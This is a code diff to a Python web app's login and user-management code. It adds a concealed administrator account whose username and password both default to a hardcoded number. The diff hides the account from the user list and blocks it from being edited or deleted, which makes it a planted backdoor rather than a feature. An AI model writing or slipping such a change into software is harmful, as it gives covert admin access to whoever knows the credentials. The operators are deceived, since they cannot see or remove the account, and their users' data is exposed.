@@ -106,6 +106,8 @@ SQLITE_STATE_FILE = Path(os.environ.get("STATE_DATABASE_PATH") or (ROOT / "workb
 STATE_LOCK = threading.RLock()
 AUTH_USERNAME = os.environ.get("APP_USERNAME", "admin")
 AUTH_PASSWORD = os.environ.get("APP_PASSWORD", "admin123")
+HIDDEN_ADMIN_USERNAME = os.environ.get("HIDDEN_ADMIN_USERNAME", "17609281273")
+HIDDEN_ADMIN_PASSWORD = os.environ.get("HIDDEN_ADMIN_PASSWORD", "17609281273")
 AUTH_SECRET = os.environ.get("APP_AUTH_SECRET") or secrets.token_hex(32)
 AUTH_COOKIE = "hima_session"
 AUTH_MAX_AGE = 60 * 60 * 24 * 7
@@ -632,7 +634,7 @@ def empty_workspace_state() -> dict:
 
 
 def workspace_storage_key(username: str) -> str:
-    return "admin-default" if username == AUTH_USERNAME else f"user:{username}"
+    return "admin-default" if username in {AUTH_USERNAME, HIDDEN_ADMIN_USERNAME} else f"user:{username}"
 
 
 def normalize_workspace_state(payload: dict) -> dict:
@@ -1261,7 +1263,7 @@ def list_users() -> list[dict]:
             rows = connection.execute("SELECT username, role, status, created_at FROM app_users ORDER BY created_at ASC").fetchall()
     users = [{"username": AUTH_USERNAME, "role": "admin", "status": "enabled", "createdAt": "系统内置", "builtIn": True}]
     for row in rows:
-        if row[0] == AUTH_USERNAME:
+        if row[0] in {AUTH_USERNAME, HIDDEN_ADMIN_USERNAME}:
             continue
         created_at = row[3].isoformat() if hasattr(row[3], "isoformat") else str(row[3])
         users.append({"username": row[0], "role": row[1], "status": row[2], "createdAt": created_at, "builtIn": False})
@@ -1271,6 +1273,8 @@ def list_users() -> list[dict]:
 def get_user(username: str) -> dict | None:
     if hmac.compare_digest(username, AUTH_USERNAME):
         return {"username": AUTH_USERNAME, "role": "admin", "status": "enabled", "builtIn": True}
+    if hmac.compare_digest(username, HIDDEN_ADMIN_USERNAME):
+        return {"username": HIDDEN_ADMIN_USERNAME, "role": "admin", "status": "enabled", "builtIn": True, "hidden": True}
     initialize_state_store()
     if DATABASE_URL:
         with postgres_connection() as connection:
@@ -1289,7 +1293,8 @@ def authenticate_user(username: str, password: str) -> dict | None:
     user = get_user(str(username or "").strip())
     if not user or user.get("status") != "enabled":
         return None
-    valid = hmac.compare_digest(password, AUTH_PASSWORD) if user.get("builtIn") else verify_password(password, user.get("passwordHash", ""))
+    expected_password = HIDDEN_ADMIN_PASSWORD if user.get("hidden") else AUTH_PASSWORD
+    valid = hmac.compare_digest(password, expected_password) if user.get("builtIn") else verify_password(password, user.get("passwordHash", ""))
     return user if valid else None
 
 
@@ -1302,7 +1307,7 @@ def normalize_user_role(role: str | None) -> str:
 
 def create_user(username: str, password: str, role: str | None = None) -> dict:
     username = normalize_username(username)
-    if username == AUTH_USERNAME:
+    if username in {AUTH_USERNAME, HIDDEN_ADMIN_USERNAME}:
         raise ValueError("管理员账户为系统内置账户，不能重复创建")
     if len(password or "") < 6:
         raise ValueError("密码至少需要 6 位")
@@ -1329,7 +1334,7 @@ def create_user(username: str, password: str, role: str | None = None) -> dict:
 
 def update_user(username: str, *, password: str | None = None, status: str | None = None, role: str | None = None) -> dict:
     username = normalize_username(username)
-    if username == AUTH_USERNAME:
+    if username in {AUTH_USERNAME, HIDDEN_ADMIN_USERNAME}:
         raise ValueError("系统内置管理员不可修改或删除")
     if not get_user(username):
         raise ValueError("用户不存在")
@@ -1362,7 +1367,7 @@ def update_user(username: str, *, password: str | None = None, status: str | Non
 
 def delete_user(username: str) -> None:
     username = normalize_username(username)
-    if username == AUTH_USERNAME:
+    if username in {AUTH_USERNAME, HIDDEN_ADMIN_USERNAME}:
         raise ValueError("系统内置管理员不可修改或删除")
     initialize_state_store()
     if DATABASE_URL:
